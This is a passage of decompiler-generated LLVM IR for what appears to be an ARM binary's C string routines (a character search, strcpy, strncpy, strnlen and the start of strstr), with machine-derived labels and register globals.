  ret i32 %v1_15854

bb24:                                             ; preds = %dec_label_pc_1583c
  %v2_15848 = icmp eq i8 %v3_1583c, 0
  %v2_1584c = add i32 %v1_15854, 1
  %v3_1584c = inttoptr i32 %v2_1584c to i8*
  br i1 %v2_15848, label %dec_label_pc_15928, label %dec_label_pc_15854

dec_label_pc_15854:                               ; preds = %bb24, %entry
  %.0 = phi i8* [ undef, %entry ], [ %v3_1584c, %bb24 ]
  %v1_15854 = ptrtoint i8* %.0 to i32
  %v2_15854 = urem i32 %v1_15854, 4
  %v3_15854 = icmp eq i32 %v2_15854, 0
  br i1 %v3_15854, label %dec_label_pc_1585c, label %dec_label_pc_1583c

dec_label_pc_1585c:                               ; preds = %dec_label_pc_15854
  %v4_1585c = mul nuw nsw i32 %v1_15834, 256
  %v5_1585c = or i32 %v4_1585c, %v1_15834
  %v4_15864 = mul i32 %v5_1585c, 65536
  %v5_15864 = or i32 %v4_15864, %v5_1585c
  br label %dec_label_pc_15868

dec_label_pc_15868:                               ; preds = %dec_label_pc_15920, %dec_label_pc_158a8, %dec_label_pc_1585c
  %v0_158cc = phi i32 [ %v1_15854, %dec_label_pc_1585c ], [ %v4_15868, %dec_label_pc_158a8 ], [ %v4_15868, %dec_label_pc_15920 ]
  %v1_15868 = inttoptr i32 %v0_158cc to i32*
  %v2_15868 = load i32, i32* %v1_15868, align 4
  %v4_15868 = add i32 %v0_158cc, 4
  %v2_15870 = xor i32 %v2_15868, %v5_15864
  %v2_1587c = add i32 %v2_15868, 2130640639
  %v1_15880 = sub i32 -1, %v2_15868
  %v2_15884 = xor i32 %v2_1587c, %v1_15880
  %v2_15888 = add i32 %v2_15870, 2130640639
  %v1_15890 = sub i32 -1, %v2_15870
  %v2_15894 = and i32 %v2_15884, -2130640640
  %v2_15898 = xor i32 %v2_15888, %v1_15890
  %v2_1589c = icmp eq i32 %v2_15894, 0
  %v2_158a0 = and i32 %v2_15898, -2130640640
  store i32 %v2_158a0, i32* @lr, align 4
  br i1 %v2_1589c, label %dec_label_pc_158a8, label %dec_label_pc_158b0

dec_label_pc_158a8:                               ; preds = %dec_label_pc_15868
  %v2_158a8 = icmp eq i32 %v2_158a0, 0
  br i1 %v2_158a8, label %dec_label_pc_15868, label %dec_label_pc_158b0

dec_label_pc_158b0:                               ; preds = %dec_label_pc_15868, %dec_label_pc_158a8
  %v2_158b0 = inttoptr i32 %v0_158cc to i8*
  %v3_158b0 = load i8, i8* %v2_158b0, align 1
  %v4_158b0 = zext i8 %v3_158b0 to i32
  %v1_158b8 = add i32 %v0_158cc, 1
  %v1_158bc = add i32 %v0_158cc, 2
  %v9_158c0 = icmp eq i32 %v4_158b0, %v1_15834
  %v1_158c4 = add i32 %v0_158cc, 3
  store i32 %v1_158c4, i32* @ip, align 4
  br i1 %v9_158c0, label %dec_label_pc_158cc, label %dec_label_pc_158d4

dec_label_pc_158cc:                               ; preds = %dec_label_pc_158b0
  store i32 %v6_15830, i32* @r5, align 4
  store i32 %v9_15830, i32* @r6, align 4
  ret i32 %v0_158cc

dec_label_pc_158d4:                               ; preds = %dec_label_pc_158b0
  %v2_158d4 = icmp eq i8 %v3_158b0, 0
  br i1 %v2_158d4, label %dec_label_pc_15928, label %dec_label_pc_158dc

dec_label_pc_158dc:                               ; preds = %dec_label_pc_158d4
  %v2_158dc = inttoptr i32 %v1_158b8 to i8*
  %v3_158dc = load i8, i8* %v2_158dc, align 1
  %v4_158dc = zext i8 %v3_158dc to i32
  %v9_158e0 = icmp eq i32 %v4_158dc, %v1_15834
  br i1 %v9_158e0, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_158dc
  store i32 %v6_15830, i32* @r5, align 4
  store i32 %v9_15830, i32* @r6, align 4
  ret i32 %v1_158b8

bb26:                                             ; preds = %dec_label_pc_158dc
  %v2_158e8 = icmp eq i8 %v3_158dc, 0
  br i1 %v2_158e8, label %dec_label_pc_15928, label %dec_label_pc_158f0

dec_label_pc_158f0:                               ; preds = %bb26
  %v2_158f0 = inttoptr i32 %v1_158bc to i8*
  %v3_158f0 = load i8, i8* %v2_158f0, align 1
  %v4_158f0 = zext i8 %v3_158f0 to i32
  %v9_158f4 = icmp eq i32 %v4_158f0, %v1_15834
  br i1 %v9_158f4, label %dec_label_pc_158fc, label %dec_label_pc_15904

dec_label_pc_158fc:                               ; preds = %dec_label_pc_158f0
  store i32 %v6_15830, i32* @r5, align 4
  store i32 %v9_15830, i32* @r6, align 4
  ret i32 %v1_158bc

dec_label_pc_15904:                               ; preds = %dec_label_pc_158f0
  %v2_15904 = icmp eq i8 %v3_158f0, 0
  br i1 %v2_15904, label %dec_label_pc_15928, label %dec_label_pc_1590c

dec_label_pc_1590c:                               ; preds = %dec_label_pc_15904
  %v2_1590c = inttoptr i32 %v1_158c4 to i8*
  %v3_1590c = load i8, i8* %v2_1590c, align 1
  %v4_1590c = zext i8 %v3_1590c to i32
  %v9_15910 = icmp eq i32 %v4_1590c, %v1_15834
  br i1 %v9_15910, label %dec_label_pc_15918, label %dec_label_pc_15920

dec_label_pc_15918:                               ; preds = %dec_label_pc_1590c
  store i32 %v6_15830, i32* @r5, align 4
  store i32 %v9_15830, i32* @r6, align 4
  ret i32 %v1_158c4

dec_label_pc_15920:                               ; preds = %dec_label_pc_1590c
  %v2_15920 = icmp eq i8 %v3_1590c, 0
  br i1 %v2_15920, label %dec_label_pc_15928, label %dec_label_pc_15868

dec_label_pc_15928:                               ; preds = %bb24, %dec_label_pc_15920, %dec_label_pc_15904, %bb26, %dec_label_pc_158d4
  store i32 %v6_15830, i32* @r5, align 4
  store i32 %v9_15830, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_15868, { 1, 0 }
  uselistorder i32 %v2_15868, { 0, 2, 1 }
  uselistorder i32 %v0_158cc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1585c, { 1, 0 }
  uselistorder i32 %v1_15854, { 1, 0, 2, 3 }
  uselistorder i8* %.0, { 1, 0 }
  uselistorder i32 %v1_15834, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v9_15830, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_15830, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_15928, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_158b0, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_15938 = sub i32 %arg1, %tmp
  %v1_1593c = add i32 %v2_15938, -1
  store i32 %v1_1593c, i32* %r2.global-to-local, align 4
  %v2_159404 = load i8, i8* %arg2, align 1
  %v5_159406 = add i32 %tmp, 1
  store i32 %v5_159406, i32* %r1.global-to-local, align 4
  %v2_159447 = icmp eq i8 %v2_159404, 0
  store i1 %v2_159447, i1* %cpsr_z.global-to-local, align 1
  %v5_159488 = inttoptr i32 %arg1 to i8*
  store i8 %v2_159404, i8* %v5_159488, align 1
  %v0_1594c9 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1594c9, label %dec_label_pc_15950, label %dec_label_pc_15940.dec_label_pc_15940_crit_edge

dec_label_pc_15940.dec_label_pc_15940_crit_edge:  ; preds = %entry, %dec_label_pc_15940.dec_label_pc_15940_crit_edge
  %v0_15940.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_15948.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15940 = inttoptr i32 %v0_15940.pre to i8*
  %v2_15940 = load i8, i8* %v1_15940, align 1
  %v5_15940 = add i32 %v0_15940.pre, 1
  store i32 %v5_15940, i32* %r1.global-to-local, align 4
  %v2_15944 = icmp eq i8 %v2_15940, 0
  store i1 %v2_15944, i1* %cpsr_z.global-to-local, align 1
  %v4_15948 = add i32 %v5_15940, %v3_15948.pre
  %v5_15948 = inttoptr i32 %v4_15948 to i8*
  store i8 %v2_15940, i8* %v5_15948, align 1
  %v0_1594c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1594c, label %dec_label_pc_15950, label %dec_label_pc_15940.dec_label_pc_15940_crit_edge

dec_label_pc_15950:                               ; preds = %dec_label_pc_15940.dec_label_pc_15940_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15940.dec_label_pc_15940_crit_edge, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_15954 = icmp eq i32 %arg2, 3
  store i1 %v7_15954, i1* %cpsr_z.global-to-local, align 1
  %v1_1595c = add i32 %arg1, -1
  store i32 %v1_1595c, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_159d8, label %dec_label_pc_15964

dec_label_pc_15964:                               ; preds = %entry
  %v3_15964 = udiv i32 %arg2, 4
  store i32 %v3_15964, i32* @lr, align 4
  %v0_15968.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_15968

dec_label_pc_15968:                               ; preds = %dec_label_pc_159b4, %dec_label_pc_15964
  %v2_15970 = phi i32 [ %v6_159a8, %dec_label_pc_159b4 ], [ %v1_1595c, %dec_label_pc_15964 ]
  %v0_15968 = phi i32 [ %v1_159b8, %dec_label_pc_159b4 ], [ %v0_15968.pre, %dec_label_pc_15964 ]
  %v1_15968 = inttoptr i32 %v0_15968 to i8*
  %v2_15968 = load i8, i8* %v1_15968, align 1
  %v3_15968 = zext i8 %v2_15968 to i32
  store i32 %v3_15968, i32* %r3.global-to-local, align 4
  %v2_1596c = icmp eq i8 %v2_15968, 0
  store i1 %v2_1596c, i1* %cpsr_z.global-to-local, align 1
  %v3_15970 = add i32 %v2_15970, 1
  %v4_15970 = inttoptr i32 %v3_15970 to i8*
  store i8 %v2_15968, i8* %v4_15970, align 1
  %v5_15970 = load i32, i32* %ip.global-to-local, align 4
  %v6_15970 = add i32 %v5_15970, 1
  store i32 %v6_15970, i32* %ip.global-to-local, align 4
  %v0_15974 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15974, label %dec_label_pc_159c4, label %dec_label_pc_15978

dec_label_pc_15978:                               ; preds = %dec_label_pc_15968
  %v0_15978 = load i32, i32* @r1, align 4
  %v1_15978 = add i32 %v0_15978, 1
  %v2_15978 = inttoptr i32 %v1_15978 to i8*
  %v3_15978 = load i8, i8* %v2_15978, align 1
  %v4_15978 = zext i8 %v3_15978 to i32
  store i32 %v4_15978, i32* %r3.global-to-local, align 4
  %v2_1597c = icmp eq i8 %v3_15978, 0
  store i1 %v2_1597c, i1* %cpsr_z.global-to-local, align 1
  %v3_15980 = add i32 %v5_15970, 2
  %v4_15980 = inttoptr i32 %v3_15980 to i8*
  store i8 %v3_15978, i8* %v4_15980, align 1
  %v5_15980 = load i32, i32* %ip.global-to-local, align 4
  %v6_15980 = add i32 %v5_15980, 1
  store i32 %v6_15980, i32* %ip.global-to-local, align 4
  %v0_15984 = load i32, i32* @r1, align 4
  %v1_15984 = add i32 %v0_15984, 1
  store i32 %v1_15984, i32* %r1.global-to-local, align 4
  %v0_15988 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15988, label %dec_label_pc_159c4, label %dec_label_pc_1598c

dec_label_pc_1598c:                               ; preds = %dec_label_pc_15978
  %v1_1598c = add i32 %v0_15984, 2
  %v2_1598c = inttoptr i32 %v1_1598c to i8*
  %v3_1598c = load i8, i8* %v2_1598c, align 1
  %v4_1598c = zext i8 %v3_1598c to i32
  store i32 %v4_1598c, i32* %r3.global-to-local, align 4
  %v2_15990 = icmp eq i8 %v3_1598c, 0
  store i1 %v2_15990, i1* %cpsr_z.global-to-local, align 1
  %v3_15994 = add i32 %v5_15980, 2
  %v4_15994 = inttoptr i32 %v3_15994 to i8*
  store i8 %v3_1598c, i8* %v4_15994, align 1
  %v5_15994 = load i32, i32* %ip.global-to-local, align 4
  %v6_15994 = add i32 %v5_15994, 1
  store i32 %v6_15994, i32* %ip.global-to-local, align 4
  %v0_15998 = load i32, i32* %r1.global-to-local, align 4
  %v1_15998 = add i32 %v0_15998, 1
  store i32 %v1_15998, i32* %r1.global-to-local, align 4
  %v0_1599c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1599c, label %dec_label_pc_159c4, label %dec_label_pc_159a0

dec_label_pc_159a0:                               ; preds = %dec_label_pc_1598c
  %v1_159a0 = add i32 %v0_15998, 2
  %v2_159a0 = inttoptr i32 %v1_159a0 to i8*
  %v3_159a0 = load i8, i8* %v2_159a0, align 1
  %v4_159a0 = zext i8 %v3_159a0 to i32
  store i32 %v4_159a0, i32* %r3.global-to-local, align 4
  %v2_159a4 = icmp eq i8 %v3_159a0, 0
  store i1 %v2_159a4, i1* %cpsr_z.global-to-local, align 1
  %v3_159a8 = add i32 %v5_15994, 2
  %v4_159a8 = inttoptr i32 %v3_159a8 to i8*
  store i8 %v3_159a0, i8* %v4_159a8, align 1
  %v5_159a8 = load i32, i32* %ip.global-to-local, align 4
  %v6_159a8 = add i32 %v5_159a8, 1
  store i32 %v6_159a8, i32* %ip.global-to-local, align 4
  %v0_159ac = load i32, i32* %r1.global-to-local, align 4
  %v1_159ac = add i32 %v0_159ac, 1
  store i32 %v1_159ac, i32* %r1.global-to-local, align 4
  %v0_159b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_159b0, label %dec_label_pc_159c4, label %dec_label_pc_159b4

dec_label_pc_159b4:                               ; preds = %dec_label_pc_159a0
  %v0_159b4 = load i32, i32* @lr, align 4
  %v1_159b4 = add i32 %v0_159b4, -1
  store i32 %v1_159b4, i32* @lr, align 4
  %v7_159b4 = icmp eq i32 %v0_159b4, 1
  store i1 %v7_159b4, i1* %cpsr_z.global-to-local, align 1
  %v1_159b8 = add i32 %v0_159ac, 2
  store i32 %v1_159b8, i32* @r1, align 4
  br i1 %v7_159b4, label %dec_label_pc_159d8, label %dec_label_pc_15968

dec_label_pc_159c4:                               ; preds = %dec_label_pc_159a0, %dec_label_pc_1598c, %dec_label_pc_15978, %dec_label_pc_15968
  %v1_159c4 = phi i32 [ %v6_159a8, %dec_label_pc_159a0 ], [ %v6_15994, %dec_label_pc_1598c ], [ %v6_15980, %dec_label_pc_15978 ], [ %v6_15970, %dec_label_pc_15968 ]
  %v2_159c41 = sub i32 %arg1, %v1_159c4
  %v2_159c8 = add i32 %v2_159c41, %arg2
  store i32 %v2_159c8, i32* %r3.global-to-local, align 4
  %v1_159cc = add i32 %v2_159c8, -1
  store i32 %v1_159cc, i32* %r2.global-to-local, align 4
  %v7_159cc = icmp eq i32 %v2_159c8, 1
  store i1 %v7_159cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_159cc, label %bb, label %dec_label_pc_159f8

bb:                                               ; preds = %dec_label_pc_159c4
  ret i32 %arg1

dec_label_pc_159d8:                               ; preds = %dec_label_pc_159b4, %entry
  %v2_159e86 = phi i32 [ %v1_1595c, %entry ], [ %v6_159a8, %dec_label_pc_159b4 ]
  %v1_159d8 = urem i32 %arg2, 4
  store i32 %v1_159d8, i32* %r2.global-to-local, align 4
  %v2_159d8 = icmp eq i32 %v1_159d8, 0
  store i1 %v2_159d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_159d8, label %bb11, label %.preheader

bb11:                                             ; preds = %dec_label_pc_159d8
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_159d8, %._crit_edge
  %v2_159e8 = phi i32 [ %v6_159e8, %._crit_edge ], [ %v2_159e86, %dec_label_pc_159d8 ]
  %v0_159e4 = phi i32 [ %v0_159e4.pre, %._crit_edge ], [ %v1_159d8, %dec_label_pc_159d8 ]
  %v0_159e0 = load i32, i32* @r1, align 4
  %v1_159e0 = inttoptr i32 %v0_159e0 to i8*
  %v2_159e0 = load i8, i8* %v1_159e0, align 1
  %v3_159e0 = zext i8 %v2_159e0 to i32
  store i32 %v3_159e0, i32* %r3.global-to-local, align 4
  %v5_159e0 = add i32 %v0_159e0, 1
  store i32 %v5_159e0, i32* @r1, align 4
  %v1_159e4 = add i32 %v0_159e4, -1
  store i32 %v1_159e4, i32* %r2.global-to-local, align 4
  %v7_159e4 = icmp eq i32 %v0_159e4, 1
  store i1 %v7_159e4, i1* %cpsr_z.global-to-local, align 1
  %v3_159e8 = add i32 %v2_159e8, 1
  %v4_159e8 = inttoptr i32 %v3_159e8 to i8*
  store i8 %v2_159e0, i8* %v4_159e8, align 1
  %v5_159e8 = load i32, i32* %ip.global-to-local, align 4
  %v6_159e8 = add i32 %v5_159e8, 1
  store i32 %v6_159e8, i32* %ip.global-to-local, align 4
  %v0_159ec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_159ec, label %bb12, label %bb13

bb12:                                             ; preds = %.preheader
  ret i32 %arg1

bb13:                                             ; preds = %.preheader
  %v0_159f0 = load i32, i32* %r3.global-to-local, align 4
  %v2_159f0 = icmp eq i32 %v0_159f0, 0
  store i1 %v2_159f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_159f0, label %dec_label_pc_159f8, label %._crit_edge

._crit_edge:                                      ; preds = %bb13
  %v0_159e4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.preheader

dec_label_pc_159f8:                               ; preds = %dec_label_pc_159c4, %bb13, %dec_label_pc_159f8
  %v2_15a00 = phi i32 [ %v6_15a00, %dec_label_pc_159f8 ], [ %v1_159c4, %dec_label_pc_159c4 ], [ %v6_159e8, %bb13 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_159fc = load i32, i32* %r2.global-to-local, align 4
  %v1_159fc = add i32 %v0_159fc, -1
  store i32 %v1_159fc, i32* %r2.global-to-local, align 4
  %v7_159fc = icmp eq i32 %v0_159fc, 1
  store i1 %v7_159fc, i1* %cpsr_z.global-to-local, align 1
  %v3_15a00 = add i32 %v2_15a00, 1
  %v4_15a00 = inttoptr i32 %v3_15a00 to i8*
  store i8 0, i8* %v4_15a00, align 1
  %v5_15a00 = load i32, i32* %ip.global-to-local, align 4
  %v6_15a00 = add i32 %v5_15a00, 1
  store i32 %v6_15a00, i32* %ip.global-to-local, align 4
  %v0_15a04 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15a04, label %dec_label_pc_15a08, label %dec_label_pc_159f8

dec_label_pc_15a08:                               ; preds = %dec_label_pc_159f8
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_15a00, { 1, 0 }
  uselistorder i32 %v0_159fc, { 1, 0 }
  uselistorder i32 %v6_159e8, { 0, 2, 1 }
  uselistorder i32 %v1_159d8, { 2, 1, 0 }
  uselistorder i32 %v2_159c8, { 2, 1, 0 }
  uselistorder i32 %v1_159b8, { 1, 0 }
  uselistorder i32 %v0_159b4, { 1, 0 }
  uselistorder i32 %v6_159a8, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 7, 1, 10, 2, 3, 4, 5, 6, 8, 9, 11, 12 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 5, 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_159f8, { 2, 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_15a0c = load i32, i32* @r1, align 4
  %v2_15a0c = icmp eq i32 %v0_15a0c, 0
  br i1 %v2_15a0c, label %bb, label %dec_label_pc_15a3c

bb:                                               ; preds = %entry
  ret i32 0

dec_label_pc_15a24:                               ; preds = %dec_label_pc_15a4c
  %v3_15a24 = icmp uge i32 %v5_15ad8, %v1_15a24
  %v9_15a24 = icmp eq i32 %v5_15ad8, %v1_15a24
  %v2_15a28 = xor i1 %v3_15a24, true
  %v3_15a28 = or i1 %v9_15a24, %v2_15a28
  br i1 %v3_15a28, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_15a24
  %v6_15a28 = sub i32 %v5_15ad8, %tmp
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_15a24, %bb19
  %v5_15a2c = phi i32 [ %v1_15a24, %dec_label_pc_15a24 ], [ %v6_15a28, %bb19 ]
  %v2_15a2c = xor i1 %v9_15a24, true
  %v3_15a2c = and i1 %v3_15a24, %v2_15a2c
  br i1 %v3_15a2c, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  %v6_15a2c = sub i32 %v5_15a2c, %tmp
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v8_15a30 = phi i32 [ %v5_15a2c, %bb20 ], [ %v6_15a2c, %bb21 ]
  ret i32 %v8_15a30

dec_label_pc_15a34:                               ; preds = %dec_label_pc_15a80
  br label %dec_label_pc_15ad4

dec_label_pc_15a3c:                               ; preds = %entry
  %v2_15a3c = add i32 %tmp, %v0_15a0c
  %v3_15a3c = icmp ult i32 %v2_15a3c, %tmp
  br i1 %v3_15a3c, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_15a3c
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_15a3c, %bb23
  %v5_15ad8 = phi i32 [ %v2_15a3c, %dec_label_pc_15a3c ], [ -1, %bb23 ]
  %v1_15a5c2 = urem i32 %tmp, 4
  %v2_15a5c3 = icmp eq i32 %v1_15a5c2, 0
  br i1 %v2_15a5c3, label %dec_label_pc_15a64, label %dec_label_pc_15a4c

dec_label_pc_15a4c:                               ; preds = %bb24, %dec_label_pc_15a58
  %v1_15a24 = phi i32 [ %v1_15a58, %dec_label_pc_15a58 ], [ %tmp, %bb24 ]
  %v1_15a4c = inttoptr i32 %v1_15a24 to i8*
  %v2_15a4c = load i8, i8* %v1_15a4c, align 1
  %v2_15a50 = icmp eq i8 %v2_15a4c, 0
  br i1 %v2_15a50, label %dec_label_pc_15a24, label %dec_label_pc_15a58

dec_label_pc_15a58:                               ; preds = %dec_label_pc_15a4c
  %v1_15a58 = add i32 %v1_15a24, 1
  %v1_15a5c = urem i32 %v1_15a58, 4
  %v2_15a5c = icmp eq i32 %v1_15a5c, 0
  br i1 %v2_15a5c, label %dec_label_pc_15a64, label %dec_label_pc_15a4c

dec_label_pc_15a64:                               ; preds = %dec_label_pc_15a58, %bb24
  %storemerge.lcssa = phi i32 [ %tmp, %bb24 ], [ %v1_15a58, %dec_label_pc_15a58 ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_15ac432 = icmp ult i32 %storemerge.lcssa, %v5_15ad8
  br i1 %v3_15ac432, label %dec_label_pc_15a6c, label %dec_label_pc_15ad4

dec_label_pc_15a6c:                               ; preds = %dec_label_pc_15ac0, %dec_label_pc_15a64
  %v0_15a3439 = phi i32 [ %v4_15a6c, %dec_label_pc_15ac0 ], [ %storemerge.lcssa, %dec_label_pc_15a64 ]
  %v1_15a6c = inttoptr i32 %v0_15a3439 to i32*
  %v2_15a6c = load i32, i32* %v1_15a6c, align 4
  %v4_15a6c = add i32 %v0_15a3439, 4
  store i32 %v4_15a6c, i32* @lr, align 4
  %v2_15a70 = add i32 %v2_15a6c, -16843009
  %v2_15a74 = and i32 %v2_15a70, -2139062144
  %v2_15a78 = icmp eq i32 %v2_15a74, 0
  br i1 %v2_15a78, label %dec_label_pc_15ac0, label %dec_label_pc_15a80

dec_label_pc_15a80:                               ; preds = %dec_label_pc_15a6c
  %v2_15a80 = inttoptr i32 %v0_15a3439 to i8*
  %v3_15a80 = load i8, i8* %v2_15a80, align 1
  %v2_15a88 = icmp eq i8 %v3_15a80, 0
  %v1_15a8c = add i32 %v0_15a3439, 1
  br i1 %v2_15a88, label %dec_label_pc_15a34, label %dec_label_pc_15a94

dec_label_pc_15a94:                               ; preds = %dec_label_pc_15a80
  %v2_15a94 = inttoptr i32 %v1_15a8c to i8*
  %v3_15a94 = load i8, i8* %v2_15a94, align 1
  %v2_15a98 = icmp eq i8 %v3_15a94, 0
  br i1 %v2_15a98, label %dec_label_pc_15ad4, label %dec_label_pc_15aa0

dec_label_pc_15aa0:                               ; preds = %dec_label_pc_15a94
  %v1_15aa0 = add i32 %v0_15a3439, 2
  %v2_15aa0 = inttoptr i32 %v1_15aa0 to i8*
  %v3_15aa0 = load i8, i8* %v2_15aa0, align 1
  %v2_15aa4 = icmp eq i8 %v3_15aa0, 0
  br i1 %v2_15aa4, label %dec_label_pc_15ad4, label %dec_label_pc_15ab0

dec_label_pc_15ab0:                               ; preds = %dec_label_pc_15aa0
  %v1_15ab0 = add i32 %v0_15a3439, 3
  %v2_15ab0 = inttoptr i32 %v1_15ab0 to i8*
  %v3_15ab0 = load i8, i8* %v2_15ab0, align 1
  %v2_15ab4 = icmp eq i8 %v3_15ab0, 0
  br i1 %v2_15ab4, label %dec_label_pc_15ad4, label %dec_label_pc_15ac0

dec_label_pc_15ac0:                               ; preds = %dec_label_pc_15ab0, %dec_label_pc_15a6c
  %v3_15ac4 = icmp ult i32 %v4_15a6c, %v5_15ad8
  br i1 %v3_15ac4, label %dec_label_pc_15a6c, label %dec_label_pc_15ad4

dec_label_pc_15ad4:                               ; preds = %dec_label_pc_15ac0, %dec_label_pc_15a64, %dec_label_pc_15a94, %dec_label_pc_15aa0, %dec_label_pc_15ab0, %dec_label_pc_15a34
  %v1_15ad4 = phi i32 [ %v0_15a3439, %dec_label_pc_15a34 ], [ %storemerge.lcssa, %dec_label_pc_15a64 ], [ %v1_15a8c, %dec_label_pc_15a94 ], [ %v1_15aa0, %dec_label_pc_15aa0 ], [ %v1_15ab0, %dec_label_pc_15ab0 ], [ %v5_15ad8, %dec_label_pc_15ac0 ]
  %v3_15ad4 = icmp uge i32 %v5_15ad8, %v1_15ad4
  %v9_15ad4 = icmp eq i32 %v5_15ad8, %v1_15ad4
  %v2_15ad8 = xor i1 %v3_15ad4, true
  %v3_15ad8 = or i1 %v9_15ad4, %v2_15ad8
  br i1 %v3_15ad8, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_15ad4
  %v6_15ad8 = sub i32 %v5_15ad8, %tmp
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_15ad4, %bb25
  %v5_15adc = phi i32 [ %v1_15ad4, %dec_label_pc_15ad4 ], [ %v6_15ad8, %bb25 ]
  %v2_15adc = xor i1 %v9_15ad4, true
  %v3_15adc = and i1 %v3_15ad4, %v2_15adc
  br i1 %v3_15adc, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v6_15adc = sub i32 %v5_15adc, %tmp
  br label %bb28

bb28:                                             ; preds = %bb26, %bb27
  %v8_15ae0 = phi i32 [ %v5_15adc, %bb26 ], [ %v6_15adc, %bb27 ]
  ret i32 %v8_15ae0

; uselistorder directives
  uselistorder i1 %v3_15ad4, { 1, 0 }
  uselistorder i32 %v4_15a6c, { 1, 2, 0 }
  uselistorder i32 %v0_15a3439, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_15a58, { 1, 0, 2 }
  uselistorder i32 %v1_15a24, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_15ad8, { 3, 4, 5, 0, 2, 1, 8, 7, 6 }
  uselistorder i1 %v3_15a24, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 5, 7, 8, 0, 6, 2, 1 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_15ad4, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_15a4c, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %v6_15aec = load i32, i32* @r5, align 4
  %v9_15aec = load i32, i32* @r6, align 4
  %v3_15af0 = load i8, i8* %arg2, align 1
  %v2_15af4 = icmp eq i8 %v3_15af0, 0
  br i1 %v2_15af4, label %bb, label %bb50

bb:                                               ; preds = %entry
  ret i32 %arg1

bb50:                                             ; preds = %entry
  %v1_15afc = add i32 %arg1, -1
  br label %dec_label_pc_15b00

dec_label_pc_15b00:                               ; preds = %dec_label_pc_15b0c, %bb50
  %v0_15b00 = phi i32 [ %v1_15b00, %dec_label_pc_15b0c ], [ %v1_15afc, %bb50 ]
  %v1_15b00 = add i32 %v0_15b00, 1
  %v2_15b00 = inttoptr i32 %v1_15b00 to i8*
  %v3_15b00 = load i8, i8* %v2_15b00, align 1
  %v2_15b04 = icmp eq i8 %v3_15b00, 0
  br i1 %v2_15b04, label %dec_label_pc_15bdc, label %dec_label_pc_15b0c

dec_label_pc_15b0c:                               ; preds = %dec_label_pc_15b00
  %v9_15b0c = icmp eq i8 %v3_15b00, %v3_15af0
  br i1 %v9_15b0c, label %dec_label_pc_15b14, label %dec_label_pc_15b00

dec_label_pc_15b14:                               ; preds = %dec_label_pc_15b0c
  %v2_15b14 = add i32 %tmp, 1
